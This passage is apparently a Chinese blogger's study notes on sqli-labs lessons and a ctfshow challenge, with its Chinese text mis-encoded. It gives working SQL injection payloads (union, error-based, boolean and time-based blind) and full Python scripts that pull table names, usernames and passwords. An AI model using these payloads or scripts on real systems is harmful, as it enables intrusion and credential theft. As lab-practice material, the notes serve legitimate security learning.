class="hljs-subst">&#123;target_table&#125;</span>è¡¨çš„æ•°æ®...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        <span class="hljs-keyword">if</span> field_names[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>]:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è·å–å­—æ®µ: <span class="hljs-subst">&#123;field_names[i]&#125;</span>&quot;</span>)<br>            data_count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM <span class="hljs-subst">&#123;target_table&#125;</span>)=<span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span><br>                response = send_payload(payload)<br>                <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                    <span class="hljs-keyword">break</span><br>                data_count += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] æ•°æ®æ¡æ•°: <span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_count):<br>                data_length = get_length(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>)<br>                data = get_string(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>, data_length)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] æ•°æ®[<span class="hljs-subst">&#123;j+<span class="hljs-number">1</span>&#125;</span>]: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹ctfshow web8 çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>url = <span class="hljs-string">&#x27;http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/&#x27;</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br> <br><span class="hljs-comment"># å¾ªç¯45æ¬¡( å¾ªç¯æ¬¡æ•°æŒ‰ç…§è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦è‡ªå®šä¹‰)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">45</span>):<br>    <span class="hljs-comment"># è·å–å½“å‰ä½¿ç”¨çš„æ•°æ®åº“</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># è·å–å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># è·å–flagè¡¨çš„å­—æ®µ</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># è·å–flagè¡¨çš„æ•°æ®</span><br>    payload = <span class="hljs-string">&#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ­£åœ¨è·å–ç¬¬ %d ä¸ªå­—ç¬¦&#x27;</span> % i)<br>    <span class="hljs-comment"># æˆªå–SQLæŸ¥è¯¢ç»“æœçš„æ¯ä¸ªå­—ç¬¦, å¹¶åˆ¤æ–­å­—ç¬¦å†…å®¹</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, <span class="hljs-number">128</span>):<br>        result = requests.get(url + payload % (i, j))<br> <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;If&#x27;</span> <span class="hljs-keyword">in</span> result.text:<br>            name += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ•°æ®åº“å/è¡¨å/å­—æ®µå/æ•°æ®: %s&#x27;</span> % name)<br>            <span class="hljs-keyword">break</span><br> <br>        <span class="hljs-comment"># å¦‚æœæŸä¸ªå­—ç¬¦ä¸å­˜åœ¨,åˆ™åœæ­¢ç¨‹åº</span><br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> count &gt;= (<span class="hljs-number">128</span> - <span class="hljs-number">31</span>):<br>            exit()<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/120115458">https://blog.csdn.net/wangyuxiang946/article/details/120115458</a></p>
<hr>
<h2 id="title-note-06date-2025-03-05-17-52-14tags-sql-labs"><a href="#title-note-06date-2025-03-05-17-52-14tags-sql-labs" class="headerlink" title="title: note-06date: 2025-03-05 17:52:14tags: sql-labs"></a>title: note-06<br>date: 2025-03-05 17:52:14<br>tags: sql-labs</h2><h1 id="sql-labs-less9"><a href="#sql-labs-less9" class="headerlink" title="sql-labs-less9"></a>sql-labs-less9</h1><p>é¢˜ç›®è¯´äº†æ˜¯å•å¼•å·é—­åˆï¼Œç„¶åæ€ä¹ˆå°è¯•éƒ½è¿”å›</p>
<blockquote>
<p>You are inâ€¦â€¦â€¦..  </p>
</blockquote>
<p>æ²¡æœ‰ç™»å½•æ˜¯å¦æˆåŠŸå›æ˜¾ï¼Œæ²¡æœ‰sqlæŠ¥é”™å›æ˜¾<br>æ„æ€å°±æ˜¯åªèƒ½ç”¨æ—¶é—´å»¶è¿Ÿæ¥åˆ¤æ–­æ³¨å…¥æ˜¯å¦æ­£ç¡®ï¼Œæ— æ³•åƒless8èƒ½ç”¨respondé•¿åº¦æ¥åˆ¤æ–­æ˜¯å¦æ­£ç¡®äº†<br>ä½¿ç”¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">sleep()<br>å’Œ<br>if<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure>
<p>æ¥æ„é€ payload,ä¾‹å¦‚ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;,1,sleep(2)) --+</span><br></code></pre></td></tr></table></figure>
<p>æ„æ€æ˜¯å¦‚æœæ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºâ€™sâ€™ï¼Œåˆ™è¿”å›1ï¼ˆtrueï¼‰,å¦åˆ™åˆ™å»¶è¿Ÿå›æ˜¾<br>åŸºäºæ­¤åŸç†</p>
<p>KIMIï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>ALPHABET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br>URL = <span class="hljs-string">&quot;http://sqli-labs.com/Less-9/?id=1&#x27; and substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27; and sleep(&#123;time&#125;)--+&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()<br>    response = requests.get(path)<br>    end = time.time()<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span><br>    position = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span><br>        <span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦ä¸ºç©º</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># å°è¯•æ¯ä¸ªå­—ç¬¦</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-comment"># è·å–æ•°æ®åº“å</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;database()&quot;</span>))<br><br><span class="hljs-comment"># è·å–è¡¨å</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;&quot;</span>))<br><br><span class="hljs-comment"># è·å–å­—æ®µå</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>))<br><br><span class="hljs-comment"># è·å–ç”¨æˆ·åå’Œå¯†ç </span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(username,&#x27;~&#x27;,password) from users&quot;</span>))<br></code></pre></td></tr></table></figure>
<p>å«kimiåŠ äº†æ³¨é‡Šï¼Œè‡ªå·±å°æ”¹äº†ä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># å¯¼å…¥requestsåº“ï¼Œç”¨äºå‘é€HTTPè¯·æ±‚</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># å¯¼å…¥timeåº“ï¼Œç”¨äºæµ‹é‡æ—¶é—´å»¶è¿Ÿ</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªåŒ…å«å¯èƒ½å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œç”¨äºçŒœæµ‹æ•°æ®åº“ã€è¡¨å’Œå­—æ®µçš„åç§°</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªæ—¶é—´å»¶è¿Ÿï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># å®šä¹‰ç›®æ ‡URLï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥çš„payloadæ¨¡æ¿</span><br><span class="hljs-comment"># &#123;sql&#125;ï¼šè¡¨ç¤ºè¦æ‰§è¡Œçš„SQLæŸ¥è¯¢</span><br><span class="hljs-comment"># &#123;position&#125;ï¼šè¡¨ç¤ºå½“å‰çŒœæµ‹çš„å­—ç¬¦ä½ç½®</span><br><span class="hljs-comment"># &#123;char&#125;ï¼šè¡¨ç¤ºå½“å‰çŒœæµ‹çš„å­—ç¬¦</span><br><span class="hljs-comment"># &#123;time&#125;ï¼šè¡¨ç¤ºå»¶è¿Ÿæ—¶é—´</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27; and if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå‘é€HTTPè¯·æ±‚å¹¶åˆ¤æ–­æ˜¯å¦å­˜åœ¨å»¶è¿Ÿ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># è®°å½•è¯·æ±‚å¼€å§‹æ—¶é—´</span><br>    response = requests.get(path)  <span class="hljs-comment"># å‘é€HTTP GETè¯·æ±‚</span><br>    end = time.time()   <span class="hljs-comment"># è®°å½•è¯·æ±‚ç»“æŸæ—¶é—´</span><br>    <span class="hljs-comment"># å¦‚æœå“åº”çŠ¶æ€ç ä¸º200ä¸”å“åº”æ—¶é—´è¶…è¿‡é¢„è®¾çš„å»¶è¿Ÿæ—¶é—´ï¼Œåˆ™è®¤ä¸ºå­˜åœ¨SQLæ³¨å…¥</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæå–æ•°æ®åº“ã€è¡¨ã€å­—æ®µæˆ–æ•°æ®</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨ç»“æœ</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># åˆå§‹åŒ–å­—ç¬¦ä½ç½®è®¡æ•°å™¨</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># æ¯æ¬¡å¾ªç¯å¢åŠ å­—ç¬¦ä½ç½®</span><br>        <span class="hljs-comment"># å°è¯•çŒœæµ‹å½“å‰å­—ç¬¦ä½ç½®æ˜¯å¦ä¸ºç©º</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># å¦‚æœä¸ºç©ºï¼Œé€€å‡ºå¾ªç¯</span><br>        <span class="hljs-comment"># éå†æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># æ„é€ å®Œæ•´çš„URLå¹¶å‘é€è¯·æ±‚</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># å¦‚æœçŒœæµ‹æ­£ç¡®ï¼Œå°†å­—ç¬¦æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># é€€å‡ºå¾ªç¯ï¼Œç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># è¿”å›æœ€ç»ˆç»“æœå­—ç¬¦ä¸²</span><br><br><span class="hljs-comment"># è·å–æ•°æ®åº“å</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># è°ƒç”¨extract_dataå‡½æ•°ï¼Œä¼ å…¥SQLæŸ¥è¯¢è¯­å¥è·å–æ•°æ®åº“å</span><br><br><span class="hljs-comment"># è·å–è¡¨å</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># è·å–å­—æ®µå</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># è·å–ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯ä»¥æ›¿æ¢è‡ªå·±æƒ³è¦çš„è¡¨å</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure>
<p>æˆ‘å‘ç°æŠŠé€—å·æ”¾æœ€å‰é¢å°±ä¸å®¹æ˜“ä¸¢é€—å·äº†ã€‚</p>
<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>å°±æ˜¯æŠŠless9çš„å•å¼•å·é—­åˆæ”¹ä¸ºåŒå¼•å·é—­åˆï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and if(substr(database(),1,1)=&#x27;s&#x27;,1,sleep(2)) --+<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-07date-2025-03-06-21-08-00tags-sql-labs"><a href="#title-note-07date-2025-03-06-21-08-00tags-sql-labs" class="headerlink" title="title: note-07date: 2025-03-06 21:08:00tags: sql-labs"></a>title: note-07<br>date: 2025-03-06 21:08:00<br>tags: sql-labs</h2><h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>ä»¥å‰ctfç»ƒä¹ é¢˜åè€Œæ˜¯postæ¨¡å¼åšçš„å¤šäº›ï¼Œ<br>notice</p>
<blockquote>
<p>æ³¨æ„åŸå…ˆè¯·æ±‚çš„å€¼è¦æ”¹ä¸ºæ•°æ®åº“ä¸å­˜åœ¨çš„å€¼å…å¾—å°†åé¢çš„æŸ¥è¯¢ç»“æœè¦†ç›–  </p>
</blockquote>
<p>hackbarä¸‹çš„ç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&#x27;union select user(),database()#&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></table></figure>
<p>ä¹‹åçš„æ³¨å…¥æ‹¼æ¥è¿›unameå  </p>
<p>çˆ†ç”¨æˆ·å’Œåº“åï¼š</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">database</span>()#</span><br></code></pre></td></tr></table></figure>
<p>çˆ†è¡¨åï¼š</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p>çˆ†å­—æ®µï¼š</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>ä¸åŠ <span class="hljs-keyword">and</span>åé¢çš„è¯å¥½åƒä¼šæŠŠå…¶å®ƒåº“çš„åŒåè¡¨ä¸‹çš„å­—æ®µçˆ†å‡ºæ¥<br></code></pre></td></tr></table></figure>
<p>æœ€åçˆ†åº“ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>åº”è¯¥æ˜¯åŠ äº†æ£€æŸ¥ï¼Œpasswordä¸èƒ½ä¸ºç©º</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;passwd=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>#&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure>
<p>å›æ˜¾  </p>
<blockquote>
<p>Your Login name:Dumb<br>Your Password:Dumb  </p>
</blockquote>
<p>æˆåŠŸé—­åˆsqlæŸ¥è¯¢,ç„¶åèµ°æµç¨‹é€šå…³ã€‚</p>
<hr>
<h2 id="title-note-08date-2025-03-07-14-10-00tags-sql-labs"><a href="#title-note-08date-2025-03-07-14-10-00tags-sql-labs" class="headerlink" title="title: note-08date: 2025-03-07 14:10:00tags: sql-labs"></a>title: note-08<br>date: 2025-03-07 14:10:00<br>tags: sql-labs</h2><h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>åªæœ‰ç™»å½•æˆåŠŸå›æ˜¾ï¼Œæ²¡å…¶å®ƒä¿¡æ¯<br>å¯†ç ä¼ å…¥å¿…é¡»æœ‰å­—ç¬¦ï¼Œé—­åˆç‚¹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) #</span><br></code></pre></td></tr></table></figure>
<h2 id="é”™è¯¯æ³¨å…¥"><a href="#é”™è¯¯æ³¨å…¥" class="headerlink" title="é”™è¯¯æ³¨å…¥"></a>é”™è¯¯æ³¨å…¥</h2><p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&amp;passwd=1&#x27;) or updatexml(1,concat(0x7e,(select user()),0x7e),1)#&amp;submit=Submit<br></code></pre></td></tr></table></figure>
<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>å› ä¸ºæœ‰ç™»å½•æˆåŠŸåé¦ˆï¼Œå¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) or if(length(database()=8),0,1)#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>
<p>å¤ªèœäº†å†™ä¸å‡ºè„šæœ¬ï¼Œä½¿ç”¨sqlmap,æˆ–è€…bpæ¥çˆ†ç ´ã€‚<br>æ‰¾äº†ä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># ç½‘ç«™è·¯å¾„</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-13/&quot;</span><br><span class="hljs-comment"># åˆ¤æ–­é•¿åº¦çš„payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or length(</span><br><span class="hljs-string">	